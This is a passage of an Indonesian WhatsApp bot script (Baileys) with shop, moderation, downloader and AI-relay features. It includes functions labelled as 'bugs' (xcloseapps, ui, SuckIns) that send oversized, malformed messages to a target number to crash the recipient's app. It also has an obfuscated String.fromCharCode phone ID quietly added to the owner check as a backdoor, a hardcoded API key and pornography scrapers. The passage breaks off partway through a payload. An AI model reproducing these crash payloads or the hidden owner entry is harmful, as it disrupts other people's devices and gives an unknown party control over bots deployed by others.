/*

const { default :
Type Case,
Simple Base
} = require("@BaseBotJavascript/Danny S8X")
const Contact Danny S8X = {
 ▢ Telegram : "@DannyExc", "t.me/DannyExc",
 ▢ WhatsApp : "000", 
}, { NOTE : Dont Delete Credit Guys }

*/

console.clear();
require('../config');
const fs = require('fs');
const pendapatanList = JSON.parse(fs.readFileSync("./source/pendapatan.json", "utf-8") || "[]");
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const { tiktokdl } = require('tiktokdl')
const { Downloader } = require("@tobyg74/tiktok-api-dl")
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const os = require('os');
const JsConfuser = require('js-confuser');
const { say } = require("cfonts")
const similarity = require('similarity');
const anon = require('../storage/menfess')
const datek = new Date((new Date).toLocaleString("en-US", {timeZone: "Asia/Jakarta"}))
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
const pino = require('pino');
const { Client } = require('ssh2');
const { addSaldo, tambahSaldo, cekSaldo, kurangiSaldo } = require('../storage/cekdatasaldo');
let domains = JSON.parse(fs.readFileSync("./source/data/domain.json"))
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, downloadMediaMessage, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require(global.baileys);
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
const jam = moment().tz('Asia/Jakarta').locale('id').format('HH:mm:ss');
const { LoadDataBase } = require('../source/message');
const contacts = JSON.parse(fs.readFileSync("./storage/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./source/settingpanel.json"))
const stokdo = JSON.parse(fs.readFileSync("./storage/database/stokdo.json"))
const listidch = JSON.parse(fs.readFileSync("./storage/database/listidch.json"))
const owners = JSON.parse(fs.readFileSync("./storage/database/owner.json"))
const kontributor = JSON.parse(fs.readFileSync("./storage/database/own.json"))
const premium = JSON.parse(fs.readFileSync("./storage/database/premium.json"))
const seller = JSON.parse(fs.readFileSync("./storage/database/reseller.json"))
const sellerr = JSON.parse(fs.readFileSync("./storage/database/resellerr.json"))
const list = JSON.parse(fs.readFileSync("./storage/database/list.json"))
const setbot = JSON.parse(fs.readFileSync("./source/data/bot.json"))
const BadNano = JSON.parse(fs.readFileSync('./source/bad.json'))
const { pinterest, pinterest2, Buddy, remini, mediafire, tiktokDl } = require('../storage/scraper');
const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('../storage/function');

module.exports = client = async (client, m, chatUpdate, store) => {
	try {
await LoadDataBase(client, m)
const botNumber = await client.decodeJid(client.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreply.selectedRowId : (m.type == 'templateButtonreplyMessage') ? m.message.templateButtonreplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓/_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const prefiks = ""
const isCmd = body.startsWith(prefix)
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isSeller = seller.includes(m.sender)
const isSellerr = sellerr.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const qtext = q = args.join(" ")
const text = q = args.join(' ')
const from = m.key.remoteJid
const isGroup = m.chat.endsWith('@g.us')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const pushname = m.pushName || "No Name"
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
    
   const { fromMe } = m
   
   let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? client.user.id : m.sender

//============== [ MESSAGE ] ================================================
const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: fs.readFileSync("./source/media/Xyz.jpg"), 
      itemCount: "9999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `⃟༑⌁⃰𝐃𝐞‌𝐬𝐭𝐫‌𝐮𝐢𝐝𝐨𝐫 𝐗‌𝐒ཀ‌‌`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return



const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''

const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "Malam Hari 🌃"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "Sore Hari 🌅"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "Siang Hari 🏞️"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "Pagi Hari 🏙️"
} else {
    ucapanWaktu = "Subuh 🌄"
};

const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

let jakartaTime = moment().tz("Asia/Jakarta"),
    jammenit = jakartaTime.format("HH:mm");


if (isCmd) {
    console.log(`
${chalk.inverse(' 🐥 COMMAND RECEIVED ')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Type:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭────────────────────────────────────────────╮')}
${chalk.greenBright.bold('│     Simple Bot - By t.me/DannyExc.              │')}
${chalk.greenBright.bold('╰────────────────────────────────────────────╯')}
    `);
}

//============= [ FAKEQUOTED ] ===============================================
const getWaktuWITA = () => {

    return moment().tz("Asia/Makassar").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWITA = getWaktuWITA();

const getWaktuWIT = () => {

    return moment().tz("Asia/Jayapura").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWIT = getWaktuWIT();        
const getWaktuWIB = () => {

    return moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWIB = getWaktuWIB();

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

const db_sider = JSON.parse(fs.readFileSync("./source/sider.json"));

const GcSiderUpdate=(i,s)=>{if(db_sider[s]){const e=db_sider[s].findIndex((s=>s.user_id===i));-1!==e?db_sider[s][e].timestamp=timestamp:db_sider[s].push({user_id:i,tanggal:tgl_hariini,timestamp:timestamp}),fs.writeFileSync("./source/sider.json",JSON.stringify(db_sider))}else db_sider[s]=[{user_id:i,tanggal:tgl_hariini,timestamp:timestamp}],fs.writeFileSync("./source/sider.json",JSON.stringify(db_sider))};

const content=JSON.stringify(m.message),wib=moment.tz("Asia/Jakarta").format("HH : mm : ss"),wit=moment.tz("Asia/Jayapura").format("HH : mm : ss"),wita=moment.tz("Asia/Makassar").format("HH : mm : ss"),time2=moment().tz("Asia/Jakarta").format("HH:mm:ss"),timestamp=moment().tz("Asia/Jakarta").valueOf(),hariini=jakartaTime.format("DD MMMM YYYY"),tgl_hariini=moment().tz("Asia/Jakarta").format("DD-MM-YYYY");


//============= [ EVENT GROUP ] ===============================================

const {
	xvideosSearch,
	xvideosdl,
	xnxxdl,
	xnxxSearch
} = require('../storage/scraper3.js')


//-# Funcation Addstock -#//
function addStock(idProduk, accountDetails) {
const jsonFileName = `source/data/${idProduk}.json`;

try {
if (!idProduk || !accountDetails) {
return reply("`[ Contoh ]` .addstock code <email>:<password>:<profil>:<pin>:<2FA>");
}
const detailParts = accountDetails.split(':');
if (detailParts.length !== 5) {
return reply('*[ System Notice ]* Format akun salah! Gunakan: allibot@gmail.com:Fahri@ali:Bebas:Bebasjikaada:Code a2f');
}
let stokData = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
try {
stokData = JSON.parse(fileContent);
} catch {
stokData = fileContent.trim().split('\n').filter(line => line.trim() !== '');
}
} catch (readErr) {
console.error('Error reading stock file:', readErr);
stokData = [];
}
const newEntry = accountDetails;
stokData.push(newEntry);
fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
let produkList = [];
try {
const data = fs.readFileSync('source/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error reading product list:', err);
return reply('Gagal membaca daftar produk.');
}

const produk = produkList.find(p => p.id === idProduk);
const produkNama = produk ? produk.nama : idProduk;
reply(`✅️ Stok berhasil ditambahkan!\n` +
`*-# Produk* : ${produkNama}\n` +
`*-# Kode Produk* : ${idProduk}\n` +
`*-# Jumlah Stok Baru* : ${stokData.length}
*[-] Jangan Lupa Beli Stock Kami [-]*`);

} catch (err) {
console.error('Error in addStock:', err);
reply('Terjadi kesalahan saat menambahkan stok.');
}
}
// -# Funcation Addtutor link -# //
function addTutorLink(code, link) {
const jsonFileName = `source/tutor/${code}.json`;

try {
if (!code || !link) {
return reply("[ Contoh ] .addtutorlink code|link\n[ Valid Code ] .addtutorlink tut101|https://example.com/tutorial");
}
let tutorLinks = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
tutorLinks = JSON.parse(fileContent);
} catch (readErr) {
console.error('Error reading tutor links file:', readErr);
tutorLinks = [];
}
const newEntry = { code, link };
tutorLinks.push(newEntry);

fs.writeFileSync(jsonFileName, JSON.stringify(tutorLinks, null, 4), 'utf8');
reply(`✅️ Tutor link berhasil ditambahkan!\n` +
`*-# Kode* : ${code}\n` +
`*-# Link* : ${link}\n` +
`*[-] Terima kasih telah menggunakan bot ini [-]*`);
} catch (err) {
console.error('Error in addTutorLink:', err);
reply('Terjadi kesalahan saat menambahkan tutor link.');
}
}
// -# Funcation Save Transaksi #- //
function saveTransactionHistory(sender, serverId, totalAmount) {
try {
if (!db.transactions) {
db.transactions = {};
}
const transactionId = `${sender}_${serverId}_${Date.now()}`;
db.transactions[transactionId] = {
sender: sender,
serverId: serverId,
amount: totalAmount,
timestamp: new Date().toISOString(),
status: 'completed'
};
const maxTransactions = 100;
const transactionKeys = Object.keys(db.transactions);
if (transactionKeys.length > maxTransactions) {
transactionKeys.slice(0, transactionKeys.length - maxTransactions)
.forEach(key => delete db.transactions[key]);
}
} catch (error) {
console.error('Error saving transaction history:', error);
client.sendMessage(m.chat, {
text: 'Gagal menyimpan riwayat transaksi.'
}, { quoted: loli });
}
}
//-# Funcation Edit Stock #-//
function editStock(idProduk, oldAccountDetails, newAccountDetails) {
const jsonFileName = `source/data/${idProduk}.json`;

try {
if (!idProduk || !oldAccountDetails || !newAccountDetails) {
return reply("`[ Contoh ]` .editstock code <lama email>:<lama password> <baru email>:<baru password>:<baru profil>:<baru pin>:<baru 2FA>");
}
const oldDetailParts = oldAccountDetails.split(':');
const newDetailParts = newAccountDetails.split(':');

if (oldDetailParts.length < 2 || newDetailParts.length !== 5) {
return reply('*[ System Notice ]* Format akun salah! Gunakan contoh: email:password email:password:profil:pin:2FA');
}
let stokData = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
try {
stokData = JSON.parse(fileContent);
} catch {
stokData = fileContent.trim().split('\n').filter(line => line.trim() !== '');
}
} catch (readErr) {
console.error('Error reading stock file:', readErr);
return reply('Tidak dapat membaca file stok.');
}
const oldEntryIndex = stokData.findIndex(entry => entry === oldAccountDetails);
if (oldEntryIndex === -1) {
return reply('*[ System Notice ]* Akun yang ingin diubah tidak ditemukan.');
}
stokData[oldEntryIndex] = newAccountDetails;
fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
let produkList = [];
try {
const data = fs.readFileSync('source/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error reading product list:', err);
}
const produk = produkList.find(p => p.id === idProduk);
const produkNama = produk ? produk.nama : idProduk;
reply(`✅️ Stok berhasil diperbarui!\n` +
`*-# Produk* : ${produkNama}\n` +
`*-# Kode Produk* : ${idProduk}\n` +
`*-# Total Stok* : ${stokData.length}\n` +
`*[-] Stok telah diperbarui dengan detail baru [-]*`);

} catch (err) {
console.error('Error in editStock:', err);
reply('Terjadi kesalahan saat mengubah stok.');
}
}
//-# Funcation Edit Produk #-//
function editProduk(kode, updateData) {
try {
let produkList = [];
try {
const data = fs.readFileSync('source/data/produk.json', 'utf8');
produkList = JSON.parse(data) || [];
} catch (err) {
console.error(err);
return reply('Terjadi kesalahan saat membaca data produk.');
}
const productIndex = produkList.findIndex(p => p.id === kode);
if (productIndex === -1) {
return reply(`Produk dengan kode ${kode} tidak ditemukan.`);
}
const existingProduct = produkList[productIndex];
const updatedProduk = {
id: kode,
nama: updateData.nama || existingProduct.nama,
harga: updateData.harga !== undefined ? parseInt(updateData.harga) : existingProduct.harga,
deskripsi: updateData.deskripsi || existingProduct.deskripsi,
snk: updateData.snk || existingProduct.snk || 'Syarat dan Ketentuan Berlaku',
terjual: existingProduct.terjual
};
if (!updatedProduk.nama || isNaN(updatedProduk.harga) || !updatedProduk.deskripsi) {
return reply('Data produk tidak valid. Pastikan nama, harga, dan deskripsi terisi dengan benar.');
}
produkList[productIndex] = updatedProduk;
try {
fs.writeFileSync('source/data/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
const updateMessage = `✅️Produk berhasil diperbarui:\n` +
`*-# Kode* : ${kode}\n` +
`*-# Nama* : ${updatedProduk.nama}\n` +
`*-# Harga* : ${updatedProduk.harga}\n` +
`*-# Deskripsi* : ${updatedProduk.deskripsi}`;

reply(updateMessage);
} catch (err) {
console.error(err);
reply('Gagal memperbarui produk. Terjadi kesalahan.');
}
} catch (err) {
console.error('Error in editProduk:', err);
reply('Terjadi kesalahan saat mengubah produk.');
}
}
//-# Funcation Del Produk -#//
function delProduk(kode, m) {
try {
const produkFilePath = 'source/data/produk.json';
const stockFilePath = `source/data/${kode}.json`;
let produkList = [];
try {
const data = fs.readFileSync(produkFilePath, 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error membaca file produk:', err);
return reply('*[ System Notice ]* Terjadi kesalahan saat membaca data produk.');
}
const produkIndex = produkList.findIndex(p => p.id === kode);
if (produkIndex === -1) {
return reply(`*[ System Notice ]* Produk dengan kode ${kode} tidak ditemukan.`);
}
const produkDihapus = produkList[produkIndex];
produkList.splice(produkIndex, 1);

try {
fs.writeFileSync(
produkFilePath, 
JSON.stringify(produkList, null, 4), 
'utf8'
);
if (fs.existsSync(stockFilePath)) {
fs.unlinkSync(stockFilePath);
}
const responseMessage = 
`🗑️ Produk Berhasil Dihapus
*-# Kode Produk: ${kode}*
*-# Nama Produk: ${produkDihapus.nama}*
*-# Harga: Rp ${produkDihapus.harga.toLocaleString()}*
*-# Waktu Dihapus: ${new Date().toLocaleString()}*
*[-] ✔️ Produk Telah Dihapus Dari Sistem [-]*`;

reply(responseMessage);
} catch (err) {
console.error('Error menulis/menghapus file:', err);
reply('Gagal menghapus produk. Terjadi kesalahan saat menyimpan.');
}
} catch (err) {
console.error('Error dalam fungsi delProduk:', err);
reply('Terjadi kesalahan umum saat menghapus produk.');
}
}


const nullgb = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
            },
            message: {
            documentMessage: {
                contactVcard: true
              }
            }
        };
        
      

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat]?.simi === true && !isCmd) {
    try {
        // Kirim permintaan ke API OpenAI
        const res = await axios.get(`https://www.ghostxdzz.web.id/api/ai/openai?query=${encodeURIComponent(m.text)}`);
        
        // Periksa respons API
        if (res.data.status && res.data.result?.message) {
            await reply(res.data.result.message); // Balas pesan AI
        }
    } catch (error) {
        console.error("Error while fetching AI response:", error.message);
    }
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await client.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await client.sendMessage(m.chat, {text: `*[ ! ] [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: loli})
await client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await client.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await client.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await client.sendMessage(m.chat, {text: `*[ ! ] [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: loli})
await client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await client.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.antilinkwa == true) {
if (m.text.includes("wa.me/") && !m.fromMe) {
let delet = m.key.participant
let bang = m.key.id
await client.sendMessage(m.chat, {text: `
😤 *[ Link Wa.Me Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur anti link wa!`, mentions: [m.sender]}, {quoted: loli})
await client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await client.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}

if (m.isGroup && db.settings.antitoxic == true) {
if (BadNano.includes(command)) {
let delet = m.key.participant
let bang = m.key.id
await client.sendMessage(m.chat, {text: `
😤 *[ Toxic Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur anti toxic!`, mentions: [m.sender]}, {quoted: loli})
await client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await client.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}

if (m.isGroup && db.settings.antilinkall == true) {
if (m.text.includes("https://") && !m.fromMe) {
let delet = m.key.participant
let bang = m.key.id
await client.sendMessage(m.chat, {text: `
😤 *[ Link Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf, kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur anti link semua media!`, mentions: [m.sender]}, {quoted: loli})
await client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await client.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}

if (m.isGroup && db.settings.autopromosi== true) {
if (m.text.includes("https://") && !m.fromMe) {
await client.sendMessage(m.chat, {text: `
*Danny S8X Menyediakan⚡*
* Panel Pterodactyl Server Private
* Vps Digital Ocean
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vav8XGHL2ATznQc17P3A

*👤 Contact Danny S8X*
* *WhatsApp Utama :*
${global.owner}
${global.sosmed}
`}, {quoted: null})
}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].autoai == true) {
    try {
        // Kirim permintaan ke API Blackbox
        const res = await axios.get(`https://api.neoxr.eu/api/blackbox?q=${encodeURIComponent(m.text)}&apikey=zakkigans12`);
        
        // Periksa respons API dan balas pesan
        if (res.data.status && res.data.data?.message) {
            await reply(res.data.data.message);
        }
    } catch (error) {
        console.error("Error while fetching AI response:", error.message);
    }
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

async function reactionMessage(emo) {
			client.sendMessage(m.chat, {
				react: {
					text: emo,
					key: m.key
				}
			});
		}

async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
		
//---(Module Function Bugs)---//
async function xcloseapps(client, target) {
  try {
    const message = {
      interactiveMessage: {
        body: { text: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}"
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }

    const msg = generateWAMessageFromContent(target, message, {})
    await client.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
      additionalNodes: [
        { tag: "biz", attrs: { native_flow_name: "payment_method" } }
      ]
    })
  } catch (err) {
    console.error(chalk.red.bold(err))
  }
}

async function ui(client, target) {
  const sxo = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
              directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
              mimetype: "image/jpeg",
              width: 99999999999999,
              height: 99999999999999,
              fileLength: 9999999999999,
              fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
              fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
              mediaKeyTimestamp: 1753804634,
              mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            }
          },
          body: { 
            text: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬" + "ꦽ".repeat(50000),
          },
          contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 700 }, () =>
            "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
          )
        ]
      },
          nativeFlowMessage: {            
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              }
            ],
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  };

  await client.relayMessage(target, sxo, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}

async function SuckIns(client, target) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 1899 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "<𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬>" + "ោ៝".repeat(10000),
      title: "𝐓𝐚𝐦𝐚 𝐌𝐨𝐝𝐬𝐬",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/J.oxyy",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };
    const videoMsg = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
        fileLength: "2534607",
        seconds: 8,
        mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
        height: 1280,
        width: 720,
        fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
